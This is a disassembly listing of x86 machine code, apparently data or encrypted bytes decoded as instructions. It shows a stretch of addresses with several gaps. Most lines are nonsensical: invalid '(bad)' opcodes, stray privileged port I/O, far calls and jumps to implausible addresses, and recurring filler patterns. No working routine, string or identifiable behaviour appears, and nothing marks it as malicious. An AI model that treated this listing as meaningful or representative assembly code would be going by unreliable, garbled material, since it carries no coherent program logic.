  41bdf2:	ja     0x41bdc8
  41bdf4:	(bad)  
  41bdf5:	xchg   edi,eax
  41bdf6:	addr16 ffreep st(6)
  41bdf9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bdfa:	int3   
  41bdfb:	mov    DWORD PTR [ebx-0x4b],ebx
  41bdfe:	mov    dh,0x92
  41be00:	cmp    al,0xcd
  41be03:	arpl   WORD PTR [eax+ebx*8],cx
  41be06:	xor    DWORD PTR es:[ebp-0x10e7318],edi
  41be0d:	enter  0x63b8,0x0
	...
  41be71:	add    BYTE PTR [eax],al
  41be73:	add    BYTE PTR [ebp-0x63956373],al
  41be79:	jnp    0x41be72
  41be7b:	out    dx,eax
  41be7c:	mov    ebp,DWORD PTR [ecx+0x2e133f66]
  41be82:	push   ss
  41be83:	test   eax,0x12830
  41be88:	add    al,0x1
  41be8a:	add    BYTE PTR [eax],al
  41be8c:	mov    dl,0x11
  41be8e:	out    0x52,eax
  41be90:	std    
  41be91:	sub    ebp,ecx
  41be93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41be94:	pop    ds
  41be95:	popf   
  41be96:	stos   DWORD PTR es:[edi],eax
  41be97:	xor    al,0x78
  41be99:	imul   edx,DWORD PTR [eax+0x3f360257],0xffffff8b
  41bea0:	inc    edi
  41bea1:	retf   
  41bea2:	mov    al,0x82
  41bea4:	cwde   
  41bea5:	sub    esi,DWORD PTR [ecx-0x1bd5d2ac]
  41beab:	adc    eax,0xcb3424c3
  41beb0:	or     eax,0x7c6f963a
  41beb5:	fdivr  DWORD PTR [esi+esi*8]
  41beb8:	(bad)  
  41beb9:	(bad)  
  41beba:	imul   edx,eax,0x57
  41bebd:	xchg   ebp,eax
  41bebe:	adc    esi,DWORD PTR [ecx-0x4de4bd7b]
  41bec4:	mov    esi,0x1e330f4b
  41bec9:	jmp    0xcd772bbf
  41bece:	dec    ecx
  41becf:	mov    edi,0xe569bfd9
  41bed4:	std    
  41bed5:	fwait
  41bed6:	sahf   
  41bed7:	sbb    al,0x6f
  41bed9:	sbb    ecx,DWORD PTR [eax]
  41bedb:	and    BYTE PTR [ecx+0x76],ah
  41bede:	jg     0x41bee8
  41bee0:	jae    0x41be6d
  41bee2:	iret   
  41bee3:	lods   al,BYTE PTR ds:[esi]
  41bee4:	jae    0x41bf16
  41bee6:	mov    ebp,0xf3f11b86
  41beeb:	stos   BYTE PTR es:[edi],al
  41beec:	std    
  41beed:	retf   
  41beee:	sbb    ch,BYTE PTR [eax]
  41bef0:	mov    eax,0x405b9f3
  41bef5:	push   edi
  41bef6:	or     edi,DWORD PTR [esi]
  41bef8:	add    al,0x64
  41befa:	retf   
  41befb:	mov    al,ds:0xc7721c1b
  41bf00:	and    bh,BYTE PTR [eax+0x28bdaf41]
  41bf06:	cmp    eax,0xb6599ed3
  41bf0b:	push   ecx
  41bf0c:	gs aad 0xf6
  41bf0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bf10:	sub    al,0x94
  41bf12:	aam    0x9c
  41bf14:	adc    BYTE PTR [esi],dl
  41bf16:	mov    cl,0x54
  41bf18:	pop    es
  41bf19:	mov    ds:0xd0c2fbfb,eax
  41bf1e:	mov    edi,0x67c587ea
  41bf23:	jl     0x41bee2
  41bf25:	add    eax,0x6009f570
  41bf2a:	mov    BYTE PTR [edi-0x3f],bh
  41bf2d:	push   edx
  41bf2e:	sti    
  41bf2f:	and    eax,0x27c2b60a
  41bf34:	(bad)  
  41bf35:	mov    edx,DWORD PTR [eax]
  41bf37:	fcom   QWORD PTR [ecx]
  41bf39:	test   eax,0xf5133b71
  41bf3e:	ins    BYTE PTR es:[edi],dx
  41bf3f:	xchg   ebp,eax
  41bf40:	sub    eax,0xcc1c732
  41bf45:	js     0x41bfbb
  41bf47:	test   BYTE PTR cs:[ecx],bl
  41bf4a:	sub    DWORD PTR [ebp-0x6d95f597],ebx
  41bf50:	adc    BYTE PTR [edi+0x44e149f7],dh
  41bf56:	imul   esp,DWORD PTR [ebx-0x5e],0x76
  41bf5a:	push   esp
  41bf5b:	jmp    0x41bf33
  41bf5d:	(bad)  [ebx]
  41bf5f:	imul   ecx,DWORD PTR [esi],0xffffffd3
  41bf62:	push   0xffffffef
  41bf64:	int3   
  41bf65:	shr    eax,1
  41bf67:	icebp  
  41bf68:	cmp    al,0x78
  41bf6a:	aad    0x9
  41bf6c:	outs   dx,DWORD PTR ds:[esi]
  41bf6d:	cmp    DWORD PTR [esp+edx*8],eax
  41bf70:	pop    ecx
  41bf71:	(bad)  
  41bf72:	test   cl,0xd4
  41bf75:	pushf  
  41bf76:	adc    dh,BYTE PTR [eax+0x5b]
  41bf79:	and    ebp,DWORD PTR [ebx+0x604b1987]
  41bf7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bf80:	add    eax,0xd128ba83
  41bf85:	mov    ah,0xf3
  41bf87:	out    dx,eax
  41bf88:	mov    eax,ds:0x37446818
  41bf8d:	cmp    al,0x93
  41bf8f:	call   0x41bf94
	...
  41bff4:	fs jae 0x41c02a
  41bff7:	es aaa 
  41bff9:	data16 jne 0x41c06f
  41bffc:	ins    BYTE PTR es:[edi],dx
  41bffd:	daa    
  41bffe:	mov    cl,0xc1
  41c000:	inc    ebx
  41c001:	cmovae esp,esp
  41c004:	xor    al,0x29
  41c006:	add    DWORD PTR [eax],eax
  41c008:	add    al,0x1
  41c00a:	add    BYTE PTR [eax],al
  41c00c:	repnz dec edx
  41c00e:	and    esi,esp
  41c010:	(bad)  
  41c011:	iret   
  41c012:	aam    0x40
  41c014:	xchg   esp,eax
  41c015:	ins    DWORD PTR es:[edi],dx
  41c016:	jp     0x41bfb4
  41c018:	retf   0xf9e9
  41c01b:	and    BYTE PTR [ebx],dl
  41c01d:	ins    BYTE PTR es:[edi],dx
  41c01e:	sbb    esp,esi
  41c020:	mov    bh,0x62
  41c022:	xchg   edx,eax
  41c023:	push   ebx
  41c024:	imul   ecx,ecx,0x6bd0443f
  41c02a:	or     BYTE PTR [ebx+0x70],bl
  41c02d:	or     DWORD PTR [eax-0x24],0xffffffe1
  41c031:	push   esi
  41c032:	(bad)  
  41c033:	repnz scas al,BYTE PTR es:[edi]
  41c035:	dec    esi
  41c036:	cli    
  41c037:	sub    bl,BYTE PTR es:[ebx+0x1b]
  41c03b:	sub    eax,0xa76bd4f3
  41c040:	add    cl,dh
  41c042:	sub    esp,DWORD PTR [edi-0x1a5f09ac]
  41c048:	outs   dx,DWORD PTR ds:[esi]
  41c049:	sbb    DWORD PTR [ebp-0x2e],ebp
  41c04c:	cmp    edi,DWORD PTR [edi]
  41c04e:	stos   DWORD PTR es:[edi],eax
  41c04f:	xchg   esp,eax
  41c050:	xor    esp,edx
  41c052:	inc    edi
  41c053:	addr16 inc esi
  41c055:	cmp    BYTE PTR [esi-0x4e0395e2],0xd1
  41c05c:	pop    esp
  41c05d:	push   cs
  41c05e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c05f:	or     BYTE PTR [edx],0x30
  41c062:	je     0x41c0d4
  41c064:	(bad)  
  41c065:	cmc    
  41c066:	leave  
  41c067:	hlt    
  41c068:	sbb    BYTE PTR [eax],bh
  41c06a:	xchg   edx,eax
  41c06b:	push   esp
  41c06c:	lahf   
  41c06d:	fs sub ebp,esi
  41c070:	jo     0x41c031
  41c072:	dec    eax
  41c073:	sub    edi,0x9e93c9f6
  41c079:	dec    eax
  41c07a:	in     eax,dx
  41c07b:	dec    ecx
  41c07c:	dec    ebp
  41c07d:	dec    eax
  41c07e:	sub    BYTE PTR [esi],bl
  41c080:	lods   eax,DWORD PTR ds:[esi]
  41c081:	dec    esp
  41c082:	scas   al,BYTE PTR es:[edi]
  41c083:	in     eax,dx
  41c084:	sti    
  41c085:	pop    edi
  41c086:	and    DWORD PTR [edi+eax*8],ebx
  41c089:	sahf   
  41c08a:	xchg   dl,ah
  41c08c:	lods   al,BYTE PTR ds:[esi]
  41c08d:	pop    edi
  41c08e:	mov    bh,0xda
  41c090:	fldlg2 
  41c092:	mov    eax,DWORD PTR [edi+0xb0e4079]
  41c098:	jl     0x41c0ce
  41c09a:	loopne 0x41c112
  41c09c:	adc    DWORD PTR [ecx+ebp*2+0x59],ebp
  41c0a0:	sbb    bl,BYTE PTR [edi]
  41c0a2:	push   cs
  41c0a3:	push   ecx
  41c0a4:	add    ecx,edx
  41c0a6:	ficom  WORD PTR [eax-0x4b206097]
  41c0ac:	popa   
  41c0ad:	(bad)  
  41c0ae:	xor    DWORD PTR [eax+edx*4],ebx
  41c0b1:	jmp    DWORD PTR [ebp-0x1e]
  41c0b4:	mov    bh,0xa8
  41c0b6:	cld    
  41c0b7:	add    ebx,esp
  41c0b9:	add    DWORD PTR [edi],ecx
  41c0bb:	pop    eax
  41c0bc:	sbb    cl,bl
  41c0be:	push   esi
  41c0bf:	ss xchg esi,eax
  41c0c1:	loop   0x41c0af
  41c0c3:	outs   dx,DWORD PTR ds:[esi]
  41c0c4:	jecxz  0x41c05e
  41c0c6:	jge    0x41c0c3
  41c0c8:	adc    al,0x9
  41c0ca:	dec    ecx
  41c0cb:	push   ebx
  41c0cc:	in     eax,dx
  41c0cd:	rcl    DWORD PTR [ebp+0x6c1520c5],1
  41c0d3:	mov    gs,WORD PTR [ecx]
  41c0d5:	dec    edx
  41c0d6:	inc    eax
  41c0d7:	mov    dh,0x8e
  41c0d9:	ds ins BYTE PTR es:[edi],dx
  41c0db:	mov    ds:0xf3bd99de,eax
  41c0e0:	int3   
  41c0e1:	push   cs
  41c0e2:	inc    esp
  41c0e3:	(bad)  
  41c0e5:	sub    ah,BYTE PTR [ebp+0x335d25f8]
  41c0eb:	lds    edx,FWORD PTR [ecx+eax*1-0x29]
  41c0ef:	aam    0x44
  41c0f1:	push   edi
  41c0f2:	lds    ecx,FWORD PTR [esi-0x7d66f238]
  41c0f8:	icebp  
  41c0f9:	inc    ebx
  41c0fa:	shl    BYTE PTR [ecx+0x73],1
  41c0fd:	daa    
  41c0fe:	dec    ebp
  41c0ff:	jne    0x41c091
  41c101:	fld    DWORD PTR [edx-0x7f]
  41c104:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c105:	cdq    
  41c106:	mov    edi,0xca16cae6
  41c10b:	dec    edi
  41c10c:	cld    
  41c10d:	push   es
  41c10e:	lahf   
  41c10f:	push   ebx
	...
  41c174:	(bad)  [edx-0x5f]
  41c177:	clc    
  41c178:	mov    bl,0xfb
  41c17a:	fldcw  WORD PTR [ebx+0x3d]
  41c17d:	add    DWORD PTR ds:0x7fc258e9,eax
  41c183:	push   ebp
  41c184:	cmp    BYTE PTR [edx],ch
  41c186:	add    DWORD PTR [eax],eax
  41c188:	add    al,0x1
  41c18a:	add    BYTE PTR [eax],al
  41c18c:	mov    bl,0x8f
  41c18e:	pop    es
  41c18f:	and    BYTE PTR [ecx],0x90
  41c192:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c193:	out    0xc1,al
  41c195:	push   0x2ea5a0f1
  41c19a:	test   eax,0x48130e0
  41c19f:	scas   eax,DWORD PTR es:[edi]
  41c1a0:	sbb    al,0x9f
  41c1a2:	sub    BYTE PTR [esi],cl
  41c1a4:	mov    esp,0x17130cc1
  41c1a9:	data16 cmp ah,BYTE PTR [ecx+0x61999bf4]
  41c1b0:	sbb    DWORD PTR [edx-0x7a],eax
  41c1b3:	clc    
  41c1b4:	cmp    ebp,DWORD PTR [edi+0x7e8575c8]
  41c1ba:	cmp    DWORD PTR [eax],eax
  41c1bc:	jmp    0x71d5:0x52bc80ab
  41c1c3:	pop    ebp
  41c1c4:	and    edx,DWORD PTR [edx]
  41c1c6:	stos   DWORD PTR es:[edi],eax
  41c1c7:	jg     0x41c213
  41c1c9:	ins    DWORD PTR es:[edi],dx
  41c1ca:	inc    eax
  41c1cb:	adc    eax,0x8b7491ca
  41c1d0:	or     DWORD PTR [ecx+0x166a2c7e],eax
  41c1d6:	pusha  
  41c1d7:	dec    edx
  41c1d8:	popf   
  41c1d9:	push   eax
  41c1da:	pop    esi
  41c1db:	xchg   esp,eax
  41c1dc:	repz mov esp,DWORD PTR [edx]
  41c1df:	fidivr WORD PTR [eax-0x5adca10d]
  41c1e5:	cdq    
  41c1e6:	add    bl,ch
  41c1e8:	push   ecx
  41c1e9:	mov    DWORD PTR [edi-0x6ab9485c],edi
  41c1ef:	imul   ebp,esi,0xe67af68b
  41c1f5:	iretw  
  41c1f7:	retf   
  41c1f8:	test   eax,0xcd404b04
  41c1fd:	xchg   esi,eax
  41c1fe:	or     BYTE PTR [esi-0x24],dh
  41c201:	pop    es
  41c202:	repnz pop ecx
  41c204:	cmp    dl,BYTE PTR [edi]
  41c206:	inc    ebp
  41c207:	and    BYTE PTR [esi+0x73],ah
  41c20a:	pop    eax
  41c20b:	aas    
  41c20c:	fidiv  DWORD PTR [edi+0x3598850a]
  41c212:	pop    edi
  41c213:	fwait
  41c214:	cmc    
  41c215:	nop
  41c216:	ins    BYTE PTR es:[edi],dx
  41c217:	pop    esp
  41c218:	xchg   edx,eax
  41c219:	ja     0x41c28b
  41c21b:	imul   ebx,DWORD PTR [ebp+0x27],0x30c63a56
  41c222:	sbb    DWORD PTR [esi],esp
  41c224:	mov    cl,0xb2
  41c226:	cmp    BYTE PTR [esi],0x3f
  41c229:	pushf  
  41c22a:	and    eax,0x4c720dcd
  41c22f:	jmp    0x41c22f
  41c231:	add    dh,BYTE PTR [esi]
  41c233:	loopne 0x41c22a
  41c235:	xchg   esp,eax
  41c236:	ja     0x41c1f9
  41c238:	pop    ebp
  41c239:	(bad)  
  41c23c:	xchg   ebp,eax
  41c23d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c23e:	jecxz  0x41c289
  41c240:	js     0x41c226
  41c242:	pop    esp
  41c243:	js     0x41c295
  41c245:	mov    cl,0x93
  41c247:	out    0xb6,eax
  41c249:	xor    eax,0x977c68b0
  41c24e:	nop
  41c24f:	sbb    BYTE PTR [ecx+eiz*1-0x48584778],ch
  41c256:	inc    esi
  41c257:	jne    0x41c24d
  41c259:	push   esi
  41c25a:	stos   DWORD PTR es:[edi],eax
  41c25b:	lea    edi,[ebp-0x1a]
  41c25e:	scas   al,BYTE PTR es:[edi]
  41c25f:	adc    edi,DWORD PTR [edi]
  41c261:	sub    eax,0x99b6b537
  41c266:	push   edx
  41c267:	push   esp
  41c268:	jae    0x41c233
  41c26a:	outs   dx,BYTE PTR ds:[esi]
  41c26b:	push   cs
  41c26c:	mov    ch,0x2d
  41c26e:	adc    eax,0x38e1a00d
  41c273:	mov    al,0xec
  41c275:	xor    BYTE PTR [edi],cl
  41c277:	mov    bl,0x53
  41c279:	in     al,dx
  41c27a:	cmc    
  41c27b:	mov    ch,0x6a
  41c27d:	outs   dx,BYTE PTR ds:[esi]
  41c27e:	adc    eax,0x203f401e
  41c283:	call   0x42506d72
  41c288:	xor    ebp,DWORD PTR [edi-0x3d2b8e53]
  41c28e:	clc    
  41c28f:	in     eax,0x0
	...
  41c2f1:	add    BYTE PTR [eax],al
  41c2f3:	add    bl,dh
  41c2f5:	and    ebp,ecx
  41c2f7:	push   ebp
  41c2f8:	(bad)  
  41c2fa:	sti    
  41c2fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c2fc:	enter  0x1a95,0x14
  41c300:	repnz mov DWORD PTR [esi+0x12b3cb0],edi
  41c307:	add    BYTE PTR [ecx+eax*1],al
  41c30a:	add    BYTE PTR [eax],al
  41c30c:	in     al,dx
  41c30d:	pop    es
  41c30e:	(bad)  
  41c30f:	fild   DWORD PTR [edx+0x31]
  41c312:	stos   DWORD PTR es:[edi],eax
  41c313:	mov    edx,0xdef6585a
  41c318:	cmp    edx,DWORD PTR ds:0x4897a788
  41c31e:	int3   
  41c31f:	or     cl,BYTE PTR [ebx]
  41c321:	adc    al,BYTE PTR [esi]
  41c323:	xor    al,0x4
  41c325:	dec    esp
  41c326:	push   ss
  41c327:	jnp    0x41c307
  41c329:	mov    ah,BYTE PTR [edx+0x35cf5dce]
  41c32f:	pminsw mm7,QWORD PTR [ebx*1-0x536598d5]
  41c337:	out    0x75,eax
  41c339:	push   es
  41c33a:	mov    ecx,0xc8471e34
  41c33f:	stc    
  41c340:	push   es
  41c341:	out    dx,eax
  41c342:	retf   
  41c343:	jp     0x41c321
  41c345:	jecxz  0x41c389
  41c347:	xor    eax,DWORD PTR [edx-0x22]
  41c34a:	repnz add al,0xa6
  41c34d:	sub    edi,eax
  41c34f:	xor    DWORD PTR [esi+0x66],ebx
  41c352:	dec    ecx
  41c353:	inc    ebx
  41c354:	add    ah,BYTE PTR [ecx+0x7533a427]
  41c35a:	fnsave [ecx-0x58]
  41c35d:	mov    ch,0xd6
  41c35f:	mov    ah,0x85
  41c361:	std    
  41c362:	ss (bad) 
  41c364:	sbb    dh,dh
  41c366:	mov    ch,BYTE PTR [edi+edi*2-0xf]
  41c36a:	stc    
  41c36b:	xchg   edi,eax
  41c36c:	adc    ecx,DWORD PTR [ecx+0x47]
  41c36f:	test   al,0x9f
  41c371:	fild   QWORD PTR [ebx+ebp*2]
  41c374:	es data16 fadd st(6),st
  41c378:	and    eax,0xbda09237
  41c37d:	xor    al,0xb
  41c37f:	mov    esp,0xb510a8af
  41c384:	call   0xdcbb:0xc15e7ff8
  41c38b:	mov    esi,0x1d0ec2c6
  41c390:	push   ebp
  41c391:	or     al,0x66
  41c393:	retf   
  41c394:	pop    edx
  41c395:	dec    esp
  41c396:	xor    bh,BYTE PTR [edx+0x7962b877]
  41c39c:	ret    0xccbb
  41c39f:	mov    edx,DWORD PTR [edx]
  41c3a1:	dec    esi
  41c3a2:	enter  0x813d,0xc1
  41c3a6:	inc    esi
  41c3a7:	sbb    BYTE PTR [edi-0x230f1c6a],ah
  41c3ad:	dec    ebp
  41c3ae:	retf   0x2701
  41c3b1:	arpl   WORD PTR gs:[edi-0x2e2954e3],cx
  41c3b8:	jle    0x41c392
  41c3ba:	pop    es
  41c3bb:	xchg   ebp,eax
  41c3bc:	cmp    BYTE PTR [esi-0x542bf448],0x71
  41c3c3:	mov    al,ds:0x3e931892
  41c3c8:	cwde   
  41c3c9:	int    0xce
  41c3cb:	mov    dh,0xe
  41c3cd:	outs   dx,DWORD PTR ds:[esi]
  41c3ce:	xlat   BYTE PTR ds:[ebx]
  41c3cf:	ret    0x8d2c
  41c3d2:	adc    ecx,DWORD PTR [esi+0x738db14c]
  41c3d8:	and    eax,0xe61cfc31
  41c3dd:	sahf   
  41c3de:	or     esp,DWORD PTR [eax]
  41c3e0:	inc    esi
  41c3e1:	fist   DWORD PTR [ecx]
  41c3e3:	stc    
  41c3e4:	or     edx,DWORD PTR [eax+0x4674800d]
  41c3ea:	inc    esp
  41c3eb:	xor    BYTE PTR [ebx+0x1],bl
  41c3ee:	rcl    DWORD PTR [edi+ecx*2],cl
  41c3f1:	xchg   ebp,eax
  41c3f2:	and    al,BYTE PTR [ecx-0x17]
  41c3f5:	mov    esi,0xe7b0f5e8
  41c3fa:	or     bh,ch
  41c3fc:	call   0xbbd6:0xf60b67fe
  41c403:	cmp    BYTE PTR [bp+si+0x6a],ah
  41c407:	dec    ebx
  41c408:	jbe    0x41c3cc
  41c40a:	imul   ebp,DWORD PTR [edi],0xa0947719
	...
  41c474:	push   ebx
  41c475:	and    BYTE PTR [eax+0x5faef3ae],ah
  41c47b:	std    
  41c47c:	mov    bl,0x35
  41c47e:	dec    ebp
  41c47f:	push   ecx
  41c480:	or     eax,DWORD PTR [edi+0x2c4094dc]
  41c486:	add    DWORD PTR [eax],eax
  41c488:	add    al,0x1
  41c48a:	add    BYTE PTR [eax],al
  41c48c:	jae    0x41c48e
  41c48e:	xor    al,0x82
  41c490:	rol    DWORD PTR [ebx],cl
  41c492:	sbb    eax,0x37812c9f
  41c497:	pop    edi
  41c498:	mov    al,ds:0xe2cf0408
  41c49d:	dec    esp
  41c49e:	sbb    esp,DWORD PTR [ebp-0x59]
  41c4a1:	ds sbb al,0x86
  41c4a4:	xor    BYTE PTR [edi+0x1a],bh
  41c4a7:	sub    edx,ebx
  41c4a9:	aad    0x2e
  41c4ab:	sbb    esp,DWORD PTR [ecx]
  41c4ad:	sahf   
  41c4ae:	jl     0x41c45d
  41c4b0:	pop    es
  41c4b1:	xor    esi,DWORD PTR [ebp+0x2ee7e08c]
  41c4b7:	pop    es
  41c4b8:	mov    cl,0x4b
  41c4ba:	xor    DWORD PTR [ecx-0x1d],ecx
  41c4bd:	cdq    
  41c4be:	test   al,0x57
  41c4c0:	xchg   BYTE PTR [ebx-0x6280341f],bh
  41c4c6:	inc    ecx
  41c4c7:	xor    al,al
  41c4c9:	jge    0x41c491
  41c4cb:	fsubr  DWORD PTR [eax-0x11950342]
  41c4d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c4d2:	mov    al,ds:0xb18c8643
  41c4d7:	in     al,0x5e
  41c4d9:	xchg   edi,eax
  41c4da:	sbb    ecx,ecx
  41c4dc:	mov    ebx,0x99f97ac
  41c4e1:	or     esi,ebx
  41c4e3:	and    BYTE PTR [esi+ebp*1],dh
  41c4e6:	pushf  
  41c4e7:	fild   WORD PTR [esp+eax*8-0x41]
  41c4eb:	mov    esp,0x7a65d4da
  41c4f0:	mov    ebp,0xa2505eac
  41c4f5:	or     eax,0xcd8c00ae
  41c4fa:	(bad)  
  41c4fc:	fwait
  41c4fd:	rol    DWORD PTR [edi-0x21],cl
  41c500:	in     eax,0x6b
  41c502:	(bad)  
  41c503:	fcomp  QWORD PTR [eax+0x75]
  41c506:	loop   0x41c4fa
  41c508:	push   ebp
  41c509:	sub    bh,al
  41c50b:	inc    eax
  41c50c:	jecxz  0x41c557
  41c50e:	inc    ebx
  41c50f:	adc    DWORD PTR [edi+ecx*4+0x75ec81ea],0xffffff9c
  41c517:	aas    
  41c518:	mov    ds:0x658a973,eax
  41c51d:	sub    ch,BYTE PTR [ebx-0x12]
  41c520:	pop    ecx
  41c521:	retf   0xea74
  41c524:	cmp    eax,DWORD PTR [esi]
  41c526:	pop    edx
  41c527:	cld    
  41c528:	adc    ah,BYTE PTR [ebx]
  41c52a:	aam    0xb0
  41c52c:	call   0xfa62ed34
  41c531:	push   es
  41c532:	sbb    eax,ebx
  41c534:	sub    dh,BYTE PTR [edx]
  41c536:	fistp  DWORD PTR [esi+ebx*1]
  41c539:	fwait
  41c53a:	ins    DWORD PTR es:[edi],dx
  41c53b:	and    al,0xf2
  41c53d:	xor    al,0xb
  41c53f:	pop    ebp
  41c540:	in     al,0xe1
  41c542:	xchg   ebx,eax
  41c543:	sub    ah,BYTE PTR [edx-0x157b08e5]
  41c549:	mov    ch,0x93
  41c54b:	js     0x41c5a2
  41c54d:	cli    
  41c54e:	das    
  41c54f:	or     ecx,DWORD PTR [ecx]
  41c551:	pop    edx
  41c552:	jmp    FWORD PTR [eax+0x52]
  41c555:	sub    BYTE PTR [esi+0xbb098ec],ch
  41c55b:	neg    DWORD PTR [esp+eax*2]
  41c55e:	mov    ch,0xae
  41c560:	scas   al,BYTE PTR es:[edi]
  41c561:	daa    
  41c562:	and    al,0x5
  41c564:	icebp  
  41c565:	pop    edi
  41c566:	sub    edx,ecx
  41c568:	lods   eax,DWORD PTR ds:[esi]
  41c569:	pop    edi
  41c56a:	xor    eax,0x75642934
  41c56f:	jmp    0x41c5a5
  41c571:	pop    edi
  41c572:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c573:	fisttp DWORD PTR [eax]
  41c575:	addr16 jmp 0x41c56e
  41c578:	hlt    
  41c579:	das    
  41c57a:	sbb    bl,dl
  41c57c:	aaa    
  41c57d:	ret    
  41c57e:	mov    ah,0x16
  41c580:	xor    al,0x8a
  41c582:	sub    esp,DWORD PTR [ecx+0x9]
  41c585:	lods   eax,DWORD PTR ds:[esi]
  41c586:	push   0xffffff99
  41c588:	push   ecx
  41c589:	lods   al,BYTE PTR ds:[esi]
  41c58a:	mov    ds:0x625ffa7d,al
  41c58f:	imul   eax,DWORD PTR [eax],0x0
	...
  41c5f1:	add    BYTE PTR [eax],al
  41c5f3:	add    ch,al
  41c5f5:	and    edx,DWORD PTR [ecx-0xa4808db]
  41c5fb:	jecxz  0x41c640
  41c5fd:	and    ch,ch
  41c5ff:	call   0x2d44:0xaeb25bda
  41c606:	add    DWORD PTR [eax],eax
  41c608:	add    al,0x1
  41c60a:	add    BYTE PTR [eax],al
  41c60c:	mov    al,0xff
  41c60e:	add    DWORD PTR [edi],edx
  41c610:	sub    edi,ebp
  41c612:	add    eax,0x3d3ceed0
  41c617:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c618:	xchg   ebx,eax
  41c619:	push   cs
  41c61a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c61b:	sub    BYTE PTR [esi+0x51c1c10d],bh
  41c621:	dec    edi
  41c622:	xchg   DWORD PTR [ecx],esp
  41c624:	mov    esp,DWORD PTR [ebx+0x6d]
  41c627:	or     eax,0x77810ff7
  41c62c:	ror    BYTE PTR [ecx*1+0x468fa2fb],1
  41c633:	rcl    BYTE PTR [edi+0x5a],0x2f
  41c637:	sub    dl,al
  41c639:	pop    eax
  41c63a:	mov    ebx,0xea38714b
  41c63f:	lds    esp,FWORD PTR [ebx+0x76eb2d45]
  41c645:	mov    bh,BYTE PTR [ebx+ebp*8+0x6cad4ac0]
  41c64c:	into   
  41c64d:	pop    ebx
  41c64e:	loopne 0x41c668
  41c650:	sub    eax,0x2f8bbfc3
  41c655:	pop    ebp
  41c656:	pop    ebx
  41c657:	mov    dl,0x8
  41c659:	sar    DWORD PTR [ecx],1
  41c65b:	xor    ebp,DWORD PTR [edx+0x66]
  41c65e:	sub    DWORD PTR [eax+edx*1],esi
  41c661:	in     al,0xd7
  41c663:	push   ebx
  41c664:	mov    dl,0x7
  41c666:	jp     0x41c604
  41c668:	xor    edi,DWORD PTR ds:0x80eafedb
  41c66e:	stos   BYTE PTR es:[edi],al
  41c66f:	push   0xffffffee
  41c671:	mov    ebp,0x6e1f0669
  41c676:	or     eax,esi
  41c678:	jno    0x41c6d3
  41c67a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c67b:	fcmovnbe st,st(5)
  41c67d:	(bad)  
  41c67e:	or     esi,ebx
  41c680:	mov    ebp,0xff1f0ee
  41c685:	sub    ch,bl
  41c687:	jle    0x41c630
  41c689:	sbb    DWORD PTR [esp+ebp*8+0x3738b294],edx
  41c690:	xor    BYTE PTR [esi],cl
  41c692:	js     0x41c6c2
  41c694:	add    eax,0x178340a9
  41c699:	scas   eax,DWORD PTR es:[edi]
  41c69a:	or     eax,0xca4da8bd
  41c69f:	popa   
  41c6a0:	xchg   esi,eax
  41c6a1:	lahf   
  41c6a2:	shl    DWORD PTR [eax],cl
  41c6a4:	fwait
  41c6a5:	aaa    
  41c6a6:	repz daa 
  41c6a8:	cdq    
  41c6a9:	lods   al,BYTE PTR ds:[esi]
  41c6aa:	popf   
  41c6ab:	mov    ecx,0xe6b205e6
  41c6b0:	retf   0xfb47
  41c6b3:	inc    edx
  41c6b4:	dec    edx
  41c6b5:	idiv   DWORD PTR [edi+0x74fdd418]
  41c6bb:	sbb    BYTE PTR [ebp+0x4f],dh
  41c6be:	and    al,0x10
  41c6c0:	pop    ss
  41c6c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c6c2:	inc    ecx
  41c6c3:	repnz (bad) 
  41c6c6:	mov    edi,0x3856cd70
  41c6cb:	cwde   
  41c6cc:	arpl   sp,dx
  41c6ce:	test   eax,0xcc2bbb33
  41c6d3:	mov    bl,bl
  41c6d5:	mov    eax,0x518488b1
  41c6da:	xlat   BYTE PTR ds:[ebx]
  41c6db:	and    dl,BYTE PTR [ebp*4-0x13468342]
  41c6e2:	fwait
  41c6e3:	pop    esi
  41c6e4:	repz inc eax
  41c6e6:	adc    dl,dl
  41c6e8:	mov    eax,ds:0x98b7466d
  41c6ed:	xchg   BYTE PTR [edi+0x437377b3],dl
  41c6f3:	mov    ebp,0x91ed312b
  41c6f8:	adc    BYTE PTR [edi-0x1a5bf00d],ch
  41c6fe:	jle    0x41c765
  41c700:	cdq    
  41c701:	je     0x41c722
  41c703:	mov    eax,ds:0xb74df0aa
  41c708:	ins    BYTE PTR es:[edi],dx
  41c709:	data16 jo 0x41c752
  41c70c:	push   esp
  41c70d:	and    BYTE PTR [edx],dl
  41c70f:	dec    ebx
	...
  41c774:	fiadd  DWORD PTR [ecx]
  41c776:	ret    0xdb86
  41c779:	(bad)  
  41c77a:	ficomp WORD PTR [ebp-0xf]
  41c77d:	cmp    DWORD PTR [esi],esi
  41c77f:	lahf   
  41c780:	sbb    ebx,ebp
  41c782:	ret    0x48cd
  41c785:	add    DWORD PTR cs:[eax],eax
  41c788:	add    al,0x1
  41c78a:	add    BYTE PTR [eax],al
  41c78c:	dec    ecx
  41c78d:	sar    ebx,1
  41c78f:	ss aam 0xc1
  41c792:	mov    ss,WORD PTR [edi]
  41c794:	or     ebx,DWORD PTR [ebx-0x45]
  41c797:	xlat   BYTE PTR ds:[ebx]
  41c798:	xchg   ebx,eax
  41c799:	adc    dh,BYTE PTR [eax]
  41c79b:	or     DWORD PTR [edx-0x7236f380],esi
  41c7a1:	mov    esi,0xe968bcf5
  41c7a6:	ret    0x8ff7
  41c7a9:	add    esp,esp
  41c7ab:	retf   
  41c7ac:	xor    edx,DWORD PTR [ecx-0xa4ca426]
  41c7b2:	xchg   esi,eax
  41c7b3:	lods   al,BYTE PTR ds:[esi]
  41c7b4:	std    
  41c7b5:	mov    ebx,0x60f2cf8a
